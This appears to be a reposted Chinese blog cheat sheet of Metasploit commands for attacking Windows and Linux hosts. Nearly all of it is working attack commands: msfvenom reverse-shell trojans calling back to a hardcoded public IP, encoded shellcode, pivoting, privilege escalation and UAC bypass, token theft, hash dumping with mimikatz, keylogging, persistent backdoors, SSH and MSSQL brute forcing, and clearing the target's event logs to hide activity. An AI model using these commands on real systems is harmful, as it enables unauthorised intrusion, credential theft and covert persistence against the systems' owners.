kali中msf常用命令
2018年02月10日 15:49:01 p0ther 阅读数：1908 标签： kali msf 更多
个人分类： 安全

原文地址：https://www.cnblogs.com/hookjoy/p/7989715.html
Msf的一些常用操作

    payload的几个常用生成

    生成windows下的反弹木马

        msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe > 8888.exe
        // -p < payload > -f < format> -o < path> = >

    监听

        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 172.17.150.246 //阿里云云服务器这里是内网ip
        set LPORT 8888
        exploit -j

    PHP：

        msfvenom -p php/meterpreter_reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f raw > shell.php
        use exploit/multi/handler
        set PAYLOAD php/meterpreter_reverse_tcp
        set LHOST 172.17.150.246
        set LPORT 8888
        exploit -j

    shellcode：

        msfvenom -p windows/meterpreter/reverse_tcp LPORT=1234 LHOST=60.205.212.140 -e x86/shikata_ga_nai -i 11 -f py > 1.py //-e 使用编码 -i 编码次数

    内网代理

    首先需要链接sessions,在此基础下添加路由

        meterpreter > run get_local_subnets //获取网段
        meterpreter > run autoroute -s 172.2.175.0/24 //添加路由
        meterpreter > run autoroute -p //查看路由
        meterpreter > run autoroute -d -s 172.2.175.0 //删除网段
        meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。
        meterpreter > background //后台sessions

    提权

    getsystem

        meterpreter > getsystem //直getsystem提权，最常用简单的办法

    使用exp提权

        meterpreter > background //先后台运行会话
        [*] Backgrounding session 1…
        msf > use post/windows/escalate/ms10_073_kbdlayout
        msf > show options
        msf > set session 1 //设置要使用的会话
        msf post(ms10_073_kbdlayout) > exploit
        注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。
        或者直接：
        meterpreter > run post/windows/escalate/ms10_073_kbdlayout

3.盗取令牌

    meterpreter > use incognito //进入这个模块
    meterpreter > list_tokens –u //查看存在的令牌
    meterpreter > impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠

    注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。

4.Bypassuac

    msf > use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样
    msf > show options
    msf > set session 4
    msf > run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权

5.Hash

    meterpreter > run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。

    建立持久后门

    服务启动后门：

        meterpreter > run metsvc -A //再开起一个终端，进入msfconsole
        msf > use exploit/multi/handler //新终端中监听
        msf > set payload windows/metsvc_bind_tcp
        msf > set LPORT 31337
        msf > set RHOST 192.168.0.128
        msf > run //获取到的会话是system权限

    启动项启动后门

        meterpreter > run persistence -X -i 10 -p 6666 -r 192.168.71.105

        // -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。
        注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。
        缺点：容易被杀毒软件杀 。

这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程。

    漏洞扫描

    对端口都扫描

        use auxiliary/scanner/portscan/tcp
        show options
        set rhosts 192.168.2.1-255
        set ports 21,22,25,443,445,1433,3306
        set threads 20
        exploit

    mssql开发利用

            对各个ip是否有mssql服务的探测
            use scanner/mssql/mssql_ping //测试MSSQL的存在和信息
            show options
            set rhosts 192.168.2.1-255
            set threads 30
            exploit
            对扫描到的ip进行爆破
            use scanner/mssql/mssql_login //具体配置show options。
            sa权限对其利用
            use admin/mssql/mssql_exec
            set rhost 192.168.2.10
            set password sa
            set CMD cmd.exe /c echo hello
            exploit

    mysql开放利用
    爆破ssh模块：

        use auxiliary/scanner/ssh/ssh_login
        set rhosts 7.7.7.20
        set username root
        set pass_file /root/pass.txt //加载字典，可以收集密码做字典
        set threads 50
        run

    通过nmap扫描基本漏洞：

        msf > nmap –script=vuln 受害靶机ip地址
        msf > nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..

最后清除记录

    msf > clearev //删除目标机上的应用程序、系统和安全日志。

一些常用命令

    查看系统命令 sysinfo

    截图 screenshot

    查看是否是虚拟机 run checkvm

    查看运行木马的用户 getuid

    注入到进程 migrate pid //成功会提示successfully

    加载mimikatz模块 meterpreter > load mimikatz meterpreter > wdigest //需要system权限

    获取键盘记录：meterpreter> run post/windows/capture/keylog_recorder #运行键盘记录模块，他自己创建本文。

